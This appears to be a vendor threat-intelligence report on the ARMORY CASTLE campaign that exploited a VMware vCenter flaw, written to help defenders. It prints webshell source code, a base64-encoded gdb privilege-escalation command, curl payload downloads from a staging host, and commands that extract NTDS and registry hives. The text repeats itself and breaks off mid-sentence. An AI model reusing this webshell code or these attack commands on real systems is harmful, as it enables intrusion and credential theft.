Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05 . We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local . Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service ( vmdird ) RPC interface vmdirdbcp . We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui . The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp , tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123 . if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("
"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print("
"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...) , the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output ( getInputStream() ) and standard error ( getErrorStream() ), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code ( \nEXIT: ). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp , tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/ , and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp , and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env . ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env , any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local . BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir , forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309 , primarily the obtaining of the shared session key "K" without knowing the password , there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/ . BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py . SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm . Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear . The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “ 23345 ” and “ SSH-2.0-pulsesecure_23345 ”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local . Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh . Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t "/vmfs/volumes//.a ". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz . python vmfs_browser.py -d "/dev/disks/vml.:1" ls . python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk" python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2" python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./ python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz , copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz" , and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys ) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data. /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128] Figure 14: ARMORY CASTLE SSH Tunnel ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES ( /usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands ( cmd , upload , download , and sleep ) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog , the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py , alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE -2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide . This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch . The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool . This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. VCSA Hardening Feature Impact on the ARMORY CASTLE Attack Chain Protection Against Future Zero-Days VCSA iptables Inbound DROP Policy & Connection Logging (Management Ports) The nmap scans targeting TCP ports 443, 5480, and 22 are silently dropped because the attacker's source IP is not in the trusted whitelists. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. VCSA iptables Inbound DROP Policy (TCP 443) Even if BONESAW extracts the SAML key over port 2012, the attacker cannot utilize the SAWSNAKE-forged administrative cookies. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials. Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05 . We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local . Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service ( vmdird ) RPC interface vmdirdbcp . We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui . The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp , tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123 . if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("
"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print("
"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...) , the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output ( getInputStream() ) and standard error ( getErrorStream() ), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code ( \nEXIT: ). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp , tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/ , and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp , and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env . ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env , any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local . BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir , forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309 , primarily the obtaining of the shared session key "K" without knowing the password , there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any 